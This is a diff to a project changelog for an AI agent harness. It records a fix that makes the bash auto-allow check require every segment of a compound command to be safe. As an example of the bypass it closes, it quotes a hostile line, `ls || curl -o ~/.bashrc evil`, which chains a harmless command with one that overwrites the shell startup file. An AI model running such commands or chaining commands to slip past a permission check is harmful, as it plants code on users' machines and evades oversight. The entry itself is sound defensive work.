@@ -85,6 +85,19 @@ in this priority order and appends new findings back here.
   Fan-out-writers → review → merge flow is now complete.
 
 ### Done (recent, for context)
+- [x] **Auto-allow: per-segment + versioned interpreters** (bug 20260616-183359,
+  friction half) — `matches_bash_auto_allow` now splits on unquoted `||`/`&&`/
+  `;`/`|`/newline and requires EVERY segment to be safe, instead of trusting a
+  compound by its first segment (`ls || curl -o ~/.bashrc evil` was auto-allowed
+  with only the deny-list as backstop — now refused). Same change removes the
+  reported friction: an all-safe compound (`python3.10 --version || which
+  python3.10 || echo nf`) auto-runs. Also widened `python3?` → versioned
+  interpreters (`python3.10`/`3.11`). Live: KIT-qwen ran the exact reported
+  command in default mode (exit 0, not blocked). Quoted `|` and `2>&1` intact.
+  NOTE still open — the broader UX: a non-allowed command makes the agent ASK
+  IN PROSE ("may I have permission?") rather than popping an approve/deny dialog
+  (per-action dialogs were removed by design). That's a product decision — the
+  "ask_all" chip name implies a click-approve prompt. Needs the user's call.
 - [x] **First-turn latency: capability probe moved off the hot path** — found
   while investigating bug 20260616-101958 (Dashboard/KIT/azure.gpt-5.4 "Hallo"
   → 92.7s). The per-turn `stream_message` did a synchronous live `/v1/models`
